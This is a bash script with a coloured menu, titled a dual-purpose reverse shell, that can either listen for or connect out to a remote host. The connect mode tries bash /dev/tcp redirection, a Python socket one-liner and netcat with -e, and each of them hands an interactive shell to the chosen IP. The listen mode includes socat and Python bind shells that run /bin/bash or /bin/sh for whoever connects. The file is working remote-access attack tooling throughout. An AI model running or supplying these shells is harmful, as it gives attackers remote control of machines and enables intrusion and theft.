#!/bin/bash

# Dual-Purpose Reverse Shell with Simple GUI
# Can act as both LISTENER and CONNECTOR

# Colors for interface
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ASCII Art
function show_header() {
    clear
    echo -e "${PURPLE}"
    echo "  ____  _____ _____ _   _ _______ ____  "
    echo " |  _ \\| ____| ____| \\ | | ____|  _ \\ "
    echo " | |_) |  _| |  _| |  \\| |  _| | | | |"
    echo " |  _ <| |___| |___| |\\  | |___| |_| |"
    echo " |_| \\_\\_____|_____|_| \\_|_____|____/ "
    echo -e "${NC}"
    echo -e "${CYAN}   Dual Mode: Listen OR Connect${NC}"
    echo -e "${YELLOW}----------------------------------------${NC}"
    echo
}

# Check if port is available
function is_port_available() {
    local port=$1
    if command_exists nc; then
        if nc -z localhost "$port" >/dev/null 2>&1; then
            return 1 # Port in use
        fi
    else
        # Fallback method
        if ss -lnt | grep -q ":$port "; then
            return 1
        fi
    fi
    return 0 # Port available
}

# Check if command exists
function command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Start listener
function start_listener() {
    local port=$1
    
    echo -e "${GREEN}Starting listener on port $port${NC}"
    echo -e "${YELLOW}Waiting for incoming connection...${NC}"
    echo -e "${BLUE}Press Ctrl+C to stop${NC}"
    echo
    
    # Try different listener methods
    if command_exists nc; then
        nc -lvnp "$port"
    elif command_exists ncat; then
        ncat -lvp "$port"
    elif command_exists socat; then
        socat TCP-LISTEN:"$port",reuseaddr,fork EXEC:"/bin/bash"
    elif command_exists python3; then
        python3 -c "import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1);s1.bind(('0.0.0.0',$port));s1.listen(1);c,a=s1.accept();[sp.call(['/bin/sh','-i'],stdin=x,stdout=x,stderr=x) for x in [c.makefile('rw')]]"
    else
        echo -e "${RED}No suitable listener tool found (tried nc, ncat, socat, python)${NC}"
        return 1
    fi
}

# Start connector
function start_connector() {
    local ip=$1
    local port=$2
    
    echo -e "${GREEN}Connecting to $ip:$port${NC}"
    echo -e "${YELLOW}Attempting to establish reverse shell...${NC}"
    echo
    
    # Try multiple connection methods
    if command_exists bash && [ -e /dev/tcp ]; then
        echo -e "${BLUE}Trying bash /dev/tcp method...${NC}"
        bash -c "bash -i >& /dev/tcp/$ip/$port 0>&1" &
        sleep 2
        if ps -p $! >/dev/null; then
            echo -e "${GREEN}Success! Connection established.${NC}"
            return 0
        fi
    fi
    
    if command_exists python3 || command_exists python; then
        echo -e "${BLUE}Trying python method...${NC}"
        python_cmd=$(command -v python3 || command -v python)
        $python_cmd -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &
        sleep 2
        if ps -p $! >/dev/null; then
            echo -e "${GREEN}Success! Connection established.${NC}"
            return 0
        fi
    fi
    
    if command_exists nc; then
        echo -e "${BLUE}Trying netcat method...${NC}"
        nc -e /bin/sh "$ip" "$port" &
        sleep 2
        if ps -p $! >/dev/null; then
            echo -e "${GREEN}Success! Connection established.${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}Failed to establish connection using any method${NC}"
    return 1
}

# Main menu
function main_menu() {
    while true; do
        show_header
        
        echo -e "${BLUE}Select mode:${NC}"
        echo -e "1) Listen for incoming connection (be the server)"
        echo -e "2) Connect to a listener (be the client)"
        echo -e "3) Exit"
        echo
        
        read -p "Enter your choice (1-3): " choice
        
        case $choice in
            1)
                # Listener mode
                show_header
                echo -e "${GREEN}Listener Mode Selected${NC}"
                echo -e "${YELLOW}Enter the port to listen on (e.g., 4444)${NC}"
                read -p "Port: " port
                
                # Validate port
                if [[ ! $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
                    echo -e "${RED}Invalid port number! Must be 1-65535${NC}"
                    sleep 2
                    continue
                fi
                
                if ! is_port_available "$port"; then
                    echo -e "${RED}Port $port is already in use!${NC}"
                    sleep 2
                    continue
                fi
                
                start_listener "$port"
                echo -e "${YELLOW}Press any key to continue...${NC}"
                read -n 1 -s
                ;;
                
            2)
                # Connector mode
                show_header
                echo -e "${GREEN}Connector Mode Selected${NC}"
                echo -e "${YELLOW}Enter the IP and port to connect to${NC}"
                read -p "IP Address: " ip
                read -p "Port: " port
                
                # Validate inputs
                if [[ ! $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                    echo -e "${RED}Invalid IP address format!${NC}"
                    sleep 2
                    continue
                fi
                
                if [[ ! $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
                    echo -e "${RED}Invalid port number! Must be 1-65535${NC}"
                    sleep 2
                    continue
                fi
                
                start_connector "$ip" "$port"
                echo -e "${YELLOW}Press any key to continue...${NC}"
                read -n 1 -s
                ;;
                
            3)
                echo -e "\n${GREEN}Goodbye!${NC}\n"
                exit 0
                ;;
                
            *)
                echo -e "${RED}Invalid choice! Please select 1-3${NC}"
                sleep 1
                ;;
        esac
    done
}

# Check if running in terminal
if [ -t 0 ]; then
    main_menu
else
    echo -e "${RED}This script requires an interactive terminal.${NC}"
    exit 1
fi
